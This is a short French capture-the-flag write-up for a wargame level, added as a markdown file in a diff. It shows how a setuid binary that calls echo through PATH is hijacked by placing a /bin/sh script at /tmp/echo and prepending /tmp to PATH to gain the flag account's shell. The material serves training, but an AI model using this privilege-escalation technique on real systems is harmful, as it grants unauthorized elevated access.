@@ -1,0 +1,48 @@
+# level03
+
+1) Commande utilisée pour trouver le fichier appartenant à `flag03` :
+
+```bash
+ls -l
+```
+
+2) Résultat notable trouvé :
+
+Fichier : `./level03` appartenant à `flag03`
+
+3) Exécution du binaire trouvé :
+
+```bash
+chmod +x level03
+Exploit me
+```
+
+3) Inspection du binaire avec strings et file :
+
+```bash
+file level03
+strings -n 6 level03 | grep echo
+```
+4) Résultats : 
+
+Le binaire utilise echo depuis son PATH dans l'environnement et possède les droits de son créateur (setuid / setgid).
+
+5) Objectif :
+
+Détourner echo vers une invite de commande afin de lancer `getflag`.
+
+```bash
+echo '/bin/sh' > /tmp/echo
+chmod +x /tmp/echo
+```
+Maintenant le script tmp/echo ouvre une invite de commande, et ensuite on change le PATH d'echo vers tmp/echo dans l'environnement.
+
+```bash
+export PATH=/tmp:$PATH
+```
+
+6) Nous voilà maintenant dans une invite de commande possédant les droits de flag03, il ne nous reste plus qu'à appeler getflag.
+
+```bash
+getflag
+```
